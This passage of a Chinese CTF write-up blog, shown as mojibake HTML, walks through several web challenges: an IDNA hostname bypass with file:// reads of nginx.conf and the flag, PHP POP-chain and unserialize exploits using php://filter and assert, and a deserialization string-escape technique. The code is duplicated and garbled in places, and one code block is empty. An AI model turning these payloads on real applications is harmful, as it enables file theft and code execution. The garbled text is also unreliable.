class="hljs-string">&#x27;suctf.cc&#x27;</span>: return <span class="hljs-string">&quot;æˆ‘æ‰Œ your problem? 222 &quot;</span> + host newhost = [] for h in host.split(<span class="hljs-params"><span class="hljs-string">&#x27;.&#x27;</span></span>): newhost.append(<span class="hljs-params">h.encode(<span class="hljs-params"><span class="hljs-string">&#x27;idna&#x27;</span></span>).decode(<span class="hljs-params"><span class="hljs-string">&#x27;utf-8&#x27;</span></span>)</span>) parts[<span class="hljs-number">1</span>] = <span class="hljs-string">&#x27;.&#x27;</span>.join(<span class="hljs-params">newhost</span>) </span><span class="hljs-comment">#å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot;@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your pr@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;]) def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot;oblem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot;</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªä¾æ¬¡å¯¹urlè¿›è¡Œè§£æçš„è¿‡ç¨‹</p><p>è¿™å…¶ä¸­ä½¿ç”¨idnaç¼–ç </p><p>æœ‰ä¸€ä¸ªé“¾æ¥ï¼š<a href="https://bugs.python.org/issue36216">https://bugs.python.org/issue36216</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>u = <span class="hljs-string">&quot;https://example.com\uFF03@bing.com&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>]<br>bing.com<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-comment"># Simulate</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>u = <span class="hljs-string">&quot;https://example.com\uFF03@bing.com&quot;</span>.encode(<span class="hljs-string">&quot;idna&quot;</span>).decode(<span class="hljs-string">&quot;ascii&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>urlsplit(u).netloc.rpartition(<span class="hljs-string">&quot;@&quot;</span>)[<span class="hljs-number">2</span>]<br>example.com<br></code></pre></td></tr></table></figure><p>å‘ç°å­—ç¬¦  â„†  å¯ä»¥æ›¿æ¢c/u ï¼Œè”æƒ³åˆ°è¿™é¢˜è¦æˆ‘ä»¬è¯»nginx</p><p>æœ‰</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">getUrl?url=file:<span class="hljs-regexp">//</span>suctf.câ„­<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>conf/nginx.conf<br>å‘Šè¯‰æˆ‘ä»¬ flagåœ¨ <span class="hljs-regexp">/usr/</span>flag<br>getUrl?url=file:<span class="hljs-regexp">//</span>suctf.câ„­<span class="hljs-regexp">/usr/</span>fffffflag<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag is in flag.php</span><br><span class="hljs-comment">//WTF IS THIS?</span><br><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="hljs-comment">//And Crack It!</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Show;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€è·¯æ˜¯è¿™æ ·  è¿™é‡Œæ¯ä¸ªç±»çš„æ¯ä¸ªæ–¹æ³•éƒ½æœ‰ä½œç”¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>ã€Modifier::__invoke() å¯ä»¥æ–‡ä»¶è¯»å†™ï¼Œè¦æƒ³è§¦å‘å°±éœ€è¦å®ƒè¢«å½“åšå‡½æ•°ä½¿ç”¨<br><span class="hljs-number">2</span>ã€ç»§ç»­ä¸Šé¢ï¼ŒTest::__get() è¿™é‡Œå¯ä»¥è§¦å‘å‡½æ•° å› æ­¤å¤§è‡´çŸ¥é“ Test-&gt;p = Modifier::__invoke()  è¿™é‡Œçš„ä»£ç è´Ÿè´£ä½“ç°æ€è·¯ï¼Œä¸ä¼šå¾ˆä¸¥è°¨<br><span class="hljs-number">3</span>ã€æ€ä¹ˆè§¦å‘è¿™ä¸ª__get() ï¼Ÿ éœ€è¦è®©ä»–æ‰¾ä¸åˆ°æˆ–è€…æ‰¾åˆ°çš„å±æ€§ä¸èƒ½è¢«è®¿é—® Show::__toString()æä¾›äº†è¿™ä¸ªè§¦å‘çš„æ€è·¯ å‡è®¾æˆ‘ç»™strä¸€ä¸ªå®ä¾‹åŒ–çš„Testç±»å°±ä¼šå› ä¸ºæ‰¾ä¸åˆ°sourceè€Œä½¿ç”¨Test::__get()<br>æ€è·¯å°±æ˜¯è¿™æ ·ç„¶åæ¥æ„å»ºexp<br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>        <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span> ;<br>    <br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;karsa&quot;</span>;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    &#125;<br>    <br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Show(<span class="hljs-string">&#x27;1&#x27;</span>);<br>    <span class="hljs-variable">$a</span>-&gt;str = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$a</span>-&gt;str-&gt;p = <span class="hljs-keyword">new</span> Modifier();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> Show(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$b</span>));<br><span class="hljs-comment">//  Test::__get =&gt; Modifier::__invoke()</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>æ³¨å…¥ç‚¹åœ¨search.phpé‡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><p>æ²¡å‡ºæ¥å°±</p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>é¦–é¡µæºç ä¸­ç›´æ¥æœç´¢phpï¼Œå¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-keyword">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-keyword">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> HelloPhp;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><p>æœ‰exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;phpinfo()&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> HelloPhp;<br><br><span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$c</span>)).<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-comment">//O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A9%3A%22phpinfo%28%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></code></pre></td></tr></table></figure><p>ä¼ å…¥åœ¨phpinfoä¸­å¯å¾—åˆ°flag</p><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><h3 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h3><p><strong>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/x/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xixi&#x27;</span>;<br>    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;11111&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    <span class="hljs-variable">$vv</span> = serialize(<span class="hljs-variable">$user</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    <span class="hljs-variable">$vv</span> = filter(<span class="hljs-variable">$vv</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    var_dump(unserialize(<span class="hljs-variable">$vv</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(37) &quot;a:2:&#123;i:0;s:4:&quot;xixi&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(39) &quot;a:2:&#123;i:0;s:4:&quot;yyiyyi&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">bool(false)</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹åºåˆ—åŒ–çš„å†…å®¹åšäº†æ›¿æ¢åŸæœ¬é•¿åº¦ä¸º4çš„éƒ¨åˆ†ç°åœ¨é•¿åº¦ä¸º6ï¼Œæ‰€ä»¥ååºåˆ—åŒ–å¤±è´¥ã€‚</p><p>ç°åœ¨è®©æˆ‘ä»¬æ§åˆ¶$passwordçš„å†…å®¹è¿›è¡Œæ§åˆ¶æ”¹ä¸º admin å³ <code>&quot;;i:1;s:5:&quot;11111&quot;;&#125;</code> =&gt; <code>&quot;;i:1;s:5:&quot;admin&quot;;&#125;</code></p><p>æ‰€ä»¥ <code>;i:1;s:5:&quot;admin&quot;;&#125;</code> å°±æ˜¯éœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸² é•¿åº¦19</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/x/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&#x27;</span>;   <span class="hljs-comment">//19+19=38 æ‰€ä»¥å‰åŠéƒ¨åˆ†é•¿åº¦ä¸º19</span><br>    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;11111&#x27;</span>;<br>    <span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    <span class="hljs-variable">$vv</span> = serialize(<span class="hljs-variable">$user</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    <span class="hljs-variable">$vv</span> = filter(<span class="hljs-variable">$vv</span>);<br>    var_dump(<span class="hljs-variable">$vv</span>);<br>    var_dump(unserialize(<span class="hljs-variable">$vv</span>));<br><span class="hljs-meta">?&gt;</span><br>   <span class="hljs-comment">/*</span><br><span class="hljs-comment">string(72) &quot;a:2:&#123;i:0;s:38:&quot;xxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">string(91) &quot;a:2:&#123;i:0;s:38:&quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:5:&quot;admin&quot;;&#125;&quot;;i:1;s:5:&quot;11111&quot;;&#125;&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">array(2) &#123;</span><br><span class="hljs-comment">  [0] =&gt;</span><br><span class="hljs-comment">  string(38) &quot;yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;</span><br><span class="hljs-comment">  [1] =&gt;</span><br><span class="hljs-comment">  string(5) &quot;admin&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">   */</span><br></code></pre></td></tr></table></figure><h3 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h3><h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>å¾—çŸ¥ PHPç‰ˆæœ¬:5.6.40</p><p>è®¿é—® <code>/url/www.zip</code>è·å–æºç </p><h4 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h4><p>profile.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;show_profile(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br>header(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = unserialize(<span class="hljs-variable">$profile</span>);<br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = base64_encode(file_get_contents(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å‡ ä¸ªè¦ç‚¹ï¼š</p><ul><li><p>12è¡Œå­˜åœ¨ååºåˆ—åŒ–æ“ä½œ</p></li><li><p>16è¡Œæ–‡ä»¶è¯»å–</p></li><li><p>profileç»è¿‡äº†show_profileçš„å¤„ç†</p></li></ul><p>è·Ÿè¿› class.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 